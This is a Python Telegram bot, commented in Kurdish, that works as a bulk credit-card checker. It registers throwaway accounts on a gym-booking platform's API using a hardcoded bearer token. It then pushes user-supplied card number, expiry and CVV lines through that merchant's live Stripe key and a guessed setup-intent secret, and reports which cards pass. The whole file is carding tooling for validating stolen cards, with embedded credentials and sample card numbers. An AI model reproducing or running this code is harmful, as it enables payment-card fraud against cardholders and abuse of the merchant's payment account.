import telebot
import requests
import time
import logging
import re
import json
from telebot import types
import threading

# ڕێکخستنی لۆگکردن
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# تۆکێنی بۆتی تێلێگرام - ئەمە بگۆڕە بە تۆکێنی خۆت
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # جێگەی تۆکێنی بۆتەکەت دابنێ

bot = telebot.TeleBot(BOT_TOKEN)

# Glofox API Information
GLOFOX_REGISTER_URL = "https://api.glofox.com/2.0/register"
GLOFOX_LOGIN_URL = "https://auth.glofox.com/login"
GLOFOX_BRANCH_ID = "608a0490069e2d25f0655f6b"
GLOFOX_NAMESPACE = "glowcomove"
GLOFOX_AUTHORIZATION = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJfIiwiZXhwIjoxNzQ4MzU2NDg1LCJpYXQiOjE3NDU3NjQ0ODUsImlzcyI6Il8iLCJ1c2VyIjp7Il9pZCI6Imd1ZXN0IiwibmFtZXNwYWNlIjoiZ2xvd2NvbW92ZSIsImJyYW5jaF9pZCI6IjYwOGEwNDkwMDY5ZTJkMjVmMDY1NWY2YiIsImZpcnN0X25hbWUiOiJHdWVzdCIsImxhc3RfbmFtZSI6IlVzZciLCJ0eXBlIjoiR1VFU1QiLCJpc1N1cGVyQWRtaW4iOmZhbHNlfX0.VBn0vDSFFtcrnzvGnDoebyCulJxmVvlNdc3djebp_aU"

# Stripe API Information
STRIPE_CONFIRM_URL_BASE = "https://api.stripe.com/v1/setup_intents/"
STRIPE_PUBLIC_KEY = "pk_live_8e7S47GA52g6Q2PoMF4QaGzP"

# Function to register a new user on Glofox
def glofox_register(first_name, last_name, email, phone, password):
    headers = {
        "Host": "api.glofox.com",
        "Content-Type": "application/json;charset=utf-8",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "application/json, text/plain, */*",
        "Authorization": GLOFOX_AUTHORIZATION,
        "Sec-Fetch-Site": "same-site",
        "X-Glofox-Source": "webportal",
        "X-Glofox-Branch-Id": GLOFOX_BRANCH_ID,
        "X-Is-Lead-Capture": "false",
        "Sec-Fetch-Mode": "cors",
        "X-Glofox-Branch-Continent": "AS",
        "Origin": "https://app.glofox.com",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
        "Referer": "https://app.glofox.com/",
        "X-Glofox-Branch-Timezone": "Asia/Singapore",
        "Accept-Language": "en-US,en;q=0.9"
    }
    payload = {
        "first_name": first_name,
        "last_name": last_name,
        "email": email,
        "phone": phone,
        "password": password,
        "WAIVER": True,
        "birth": None,
        "consent": {"email": {"active": False}, "sms": {"active": False}}
    }
    try:
        response = requests.post(GLOFOX_REGISTER_URL, headers=headers, json=payload)
        response.raise_for_status()  # Raise an exception for bad status codes
        return response.json()
    except requests.exceptions.RequestException as e:
        logger.error(f"Error during Glofox registration: {e}")
        return None

# Function to login to Glofox
def glofox_login(login, password):
    headers = {
        "Host": "auth.glofox.com",
        "Content-Type": "application/json;charset=utf-8",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "application/json, text/plain, */*",
        "Sec-Fetch-Site": "same-site",
        "X-Glofox-Source": "webportal",
        "X-Glofox-Branch-Id": GLOFOX_BRANCH_ID,
        "X-Is-Lead-Capture": "false",
        "Sec-Fetch-Mode": "cors",
        "X-Glofox-Branch-Continent": "AS",
        "Origin": "https://app.glofox.com",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
        "Referer": "https://app.glofox.com/",
        "X-Glofox-Branch-Timezone": "Asia/Singapore",
        "Accept-Language": "en-US,en;q=0.9"
    }
    payload = {
        "branch_id": GLOFOX_BRANCH_ID,
        "namespace": GLOFOX_NAMESPACE,
        "login": login,
        "password": password
    }
    try:
        response = requests.post(GLOFOX_LOGIN_URL, headers=headers, json=payload)
        response.raise_for_status()
        return response.json().get('token')
    except requests.exceptions.RequestException as e:
        logger.error(f"Error during Glofox login: {e}")
        return None

# Function to check a credit card using Stripe Setup Intent
def check_credit_card(card_number, exp_month, exp_year, cvv, setup_intent_id):
    confirm_url = f"{STRIPE_CONFIRM_URL_BASE}{setup_intent_id}/confirm"
    headers = {
        "Host": "api.stripe.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Sec-Fetch-Site": "same-site",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Mode": "cors",
        "Origin": "https://js.stripe.com",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
        "Referer": "https://js.stripe.com/",
        "Sec-Fetch-Dest": "empty"
    }
    payload = {
        "payment_method_data[type]": "card",
        "payment_method_data[allow_redisplay]": "always",
        "payment_method_data[card][number]": card_number,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[card][exp_month]": exp_month.zfill(2),
        "payment_method_data[card][exp_year]": exp_year,
        "use_stripe_sdk": "true",
        "key": STRIPE_PUBLIC_KEY,
        "client_secret": f"{setup_intent_id}_secret_SCwDNe2dOspOvJ00yLHQp0o2UhIMtk0" # Assuming this pattern
    }
    encoded_payload = '&'.join([f"{key}={value}" for key, value in payload.items()])
    headers['Content-Length'] = str(len(encoded_payload))

    try:
        response = requests.post(confirm_url, headers=headers, data=encoded_payload)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        logger.error(f"Error during Stripe card check: {e}")
        if response is not None:
            logger.error(f"Stripe response: {response.status_code} - {response.text}")
        return {"error": str(e)}

# Function to handle checking multiple cards
def check_multiple_cards(cards, chat_id, message_id):
    results = []
    glofox_email = f"test{int(time.time())}@example.com" # Use a unique email for each test
    glofox_password = "War112233$%"

    # Register a Glofox user
    registration_result = glofox_register("Test", "User", glofox_email, "1234567890", glofox_password)
    if not registration_result:
        bot.edit_message_text("❌ Failed to register a Glofox user.", chat_id, message_id)
        return

    # Login to Glofox to potentially get a session or required data (if needed for Stripe)
    glofox_token = glofox_login(glofox_email, glofox_password)
    if not glofox_token:
        bot.edit_message_text("❌ Failed to login to Glofox.", chat_id, message_id)
        return

    # Assuming you need a Stripe Setup Intent ID. This part might need adjustment
    setup_intent_id = "seti_1RIWL9BWt0BD8l47bXmiKm73" # Using the example provided. This might be dynamic.

    for i, card_info in enumerate(cards):
        try:
            card_parts = card_info.split('|')
            if len(card_parts) != 4:
                results.append({"card": card_info, "status": "error", "message": "فۆرماتی نادروست"})
                continue

            card_number = card_parts[0].strip()
            exp_month = card_parts[1].strip()
            exp_year = card_parts[2].strip()
            cvv = card_parts[3].strip()

            # دەستکاریکردنی پەیامی چاوەڕوانی
            bot.edit_message_text(
                f"چێککردنی کارت {i+1} لە {len(cards)}...\n"
                f"کارت: {card_number}",
                chat_id, message_id
            )

            # چێککردنی کارت
            result = check_credit_card(card_number, exp_month, exp_year, cvv, setup_intent_id)

            if "error" in result:
                results.append({"card": card_info, "status": "error", "message": f"هەڵە: {result['error']}"})
            else:
                results.append({"card": card_info, "status": "success", "message": "کارت چێککرایەوە", "response": result})

            # وچانێکی کورت بۆ ڕێگرتن لە سنووردارکردن
            time.sleep(2)

        except Exception as e:
            results.append({"card": card_info, "status": "error", "message": f"هەڵەی سیستەم: {str(e)}"})

    # ئامادەکردنی پەیامی ئەنجام
    result_text = "🔄 ئەنجامی چێککردنی کرێدیت کارد:\n\n"

    for result in results:
        card_info = result["card"]
        if result["status"] == "success":
            result_text += f"✅ کارتی `{card_info}` سەرکەوتوو بوو\n{result['message']}\n\n"
        else:
            result_text += f"❌ کارتی `{card_info}` سەرکەوتوو نەبوو\n{result['message']}\n\n"

    # ئەگەر ڕیسپۆنسی وردتر بوێت
    detailed_responses = ""
    for i, result in enumerate(results):
        if "response" in result:
            try:
                response_json = json.dumps(result["response"], indent=2, ensure_ascii=False)
                detailed_responses += f"📋 ڕیسپۆنسی کارتی {i+1}:\n```\n{response_json}\n```\n\n"
            except:
                detailed_responses += f"📋 ڕیسپۆنسی کارتی {i+1}: نەتوانرا ڕیسپۆنس بە فۆرماتی JSON پیشان بدرێت\n\n"

    # دەستکاریکردنی پەیامی چاوەڕوانی بۆ ئەنجامی کۆتایی
    bot.edit_message_text(result_text, chat_id, message_id, parse_mode="Markdown")

    # ئەگەر ڕیسپۆنسەکان هەبوون، پەیامێکی جیاواز بنێرە
    if detailed_responses:
        bot.send_message(chat_id, detailed_responses, parse_mode="Markdown")

# کۆماندی سەرەتا
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message,
                "بەخێربێیت بۆ بۆتی چێککردنی کرێدیت کارد!\n\n"
                "تەنها ژمارەی کرێدیت کارد، مانگ، ساڵ و CVV بنێرە بەم شێوەیە:\n"
                "ژمارەی_کارت|مانگ|ساڵ|CVV\n\n"
                "نموونە:\n"
                "`4147202728342336|02|30|885`\n"
                "یان\n"
                "`4147202728342336|02|2030|885`\n\n"
                "بۆ چێککردنی چەند کارت پێکەوە، هەر کارتێک لە دێڕێک بنووسە.")

# کۆماندی یارمەتی
@bot.message_handler(commands=['help'])
def help_command(message):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("چێککردنی کارت", callback_data="check_card_info")
    )

    bot.reply_to(message,
                "🔹 شێوازی چێککردنی کارت:\n"
                "ژمارەی_کارت|مانگ|ساڵ|CVV\n\n"
                "🔹 نموونە:\n"
                "`4147202728342336|02|30|885`\n"
                "یان\n"
                "`4147202728342336|02|2030|885`\n\n"
                "🔹 بۆ چێککردنی چەند کارت پێکەوە:\n"
                "هەر کارتێک لە دێڕێک بنووسە",
                reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data == "check_card_info")
def check_card_info_callback(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id,
                    "بۆ چێککردنی کارت تەنها ژمارەی کارت، مانگ، ساڵ و CVV بنێرە بەم شێوەیە:\n"
                    "`4147202728342336|02|30|885`\n\n"
                    "هەردوو فۆڕماتەکە پشتگیری دەکات:\n"
                    "`4258284538223331|02|2028|822`\n"
                    "`4258284538223331|02|28|822`")
                    
                    
                    
                    # وەرگرتنی کرێدیت کارد بە فۆرماتی داواکراو - پشتگیری تەک کارت یان زۆر کارت
@bot.message_handler(func=lambda message: "|" in message.text)
def check_card_message(message):
    # پشکنینی ئەگەر چەند دێڕ هەبێت
    cards = message.text.strip().split('\n')

    # چێککردنی ئەگەر تەنها یەک کارت بێت
    if len(cards) == 1 and bool(re.match(r'^\d+\|\d+\|\d+\|\d+$', cards[0])):
        card_parts = cards[0].split('|')

        card_number = card_parts[0].strip()
        exp_month = card_parts[1].strip()
        exp_year = card_parts[2].strip()
        cvv = card_parts[3].strip()

        # نیشاندانی پەیامێک کە چێککردن بەڕێوەیە
        wait_message = bot.reply_to(message, "تکایە چاوەڕێ بکە، چێککردنی کارت بەڕێوەیە... ⏳")

        # Assuming you need a Stripe Setup Intent ID. This part might need adjustment
        setup_intent_id = "seti_1RIWL9BWt0BD8l47bXmiKm73" # Using the example provided. This might be dynamic.

        # چێککردنی کارت
        result = check_credit_card(card_number, exp_month, exp_year, cvv, setup_intent_id)

        # نیشاندانی ئەنجام
        if "error" in result:
            response_text = f"❌ هەڵە: {result.get('error', 'هەڵەیەکی نەناسراو')}"
        else:
            response_text = "✅ کارت چێککرایەوە\n" + json.dumps(result, indent=2, ensure_ascii=False)

        # دەستکاریکردنی پەیامی چاوەڕوانی بۆ ئەنجامی کۆتایی
        bot.edit_message_text(response_text, message.chat.id, wait_message.message_id, parse_mode="Markdown")

    # چێککردنی کۆمەڵە کارت
    elif len(cards) > 1:
        # دڵنیابوون لەوەی کە فۆرماتی گشت کارتەکان دروستە
        valid_cards = []
        invalid_cards = []

        for card in cards:
            card = card.strip()
            if not card:  # پشکنینی دێڕی بەتاڵ
                continue

            if re.match(r'^\d+\|\d+\|\d+\|\d+$', card):
                valid_cards.append(card)
            else:
                invalid_cards.append(card)

        if not valid_cards:
            bot.reply_to(message, "هیچ کارتێکی دروست نەدۆزرایەوە. فۆرماتی کارت دەبێت بەم شێوەیە بێت:\n`ژمارەی_کارت|مانگ|ساڵ|CVV`")
            return

        # پیشاندانی کارتە نادروستەکان ئەگەر هەبن
        if invalid_cards:
            invalid_text = "ئەم کارتانە فۆرماتیان نادروستە:\n" + "\n".join([f"❌ `{card}`" for card in invalid_cards])
            bot.reply_to(message, invalid_text, parse_mode="Markdown")

        # نیشاندانی پەیامێک کە چێککردن بەڕێوەیە
        wait_message = bot.reply_to(message,
                                   f"تکایە چاوەڕێ بکە، چێککردنی {len(valid_cards)} کارت بەڕێوەیە... ⏳\n"
                                   f"ئەم پرۆسەیە لەوانەیە کەمێک کات بخایەنێت.")

        # دەستپێکردنی ڕیشاڵێک بۆ چێککردنی گشت کارتەکان
        check_thread = threading.Thread(target=check_multiple_cards,
                                      args=(valid_cards, message.chat.id, wait_message.message_id))
        check_thread.start()

    # فۆرماتی نادروست
    else:
        bot.reply_to(message, "فۆرماتی نادروست. تکایە زانیاری کارت بەم شێوەیە بنێرە:\n`ژمارەی_کارت|مانگ|ساڵ|CVV`")

# وەرگرتنی پەیامە ئاساییەکان
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    bot.reply_to(message, "تکایە زانیاری کارت بەم شێوەیە بنێرە:\n`ژمارەی_کارت|مانگ|ساڵ|CVV`\n\nنموونە: `4147202728342336|02|30|885`\n\nبۆ چێککردنی چەند کارت پێکەوە، هەر کارتێک لە دێڕێک بنووسە.")

# فەنکشنی سەرەکی بۆت
def main():
    logger.info("بۆت دەستی بە کارکردن کرد...")
    try:
        bot.infinity_polling()
    except Exception as e:
        logger.error(f"هەڵە لە بۆت: {str(e)}")

# خاڵی دەستپێکردن
if __name__ == "__main__":
    main()
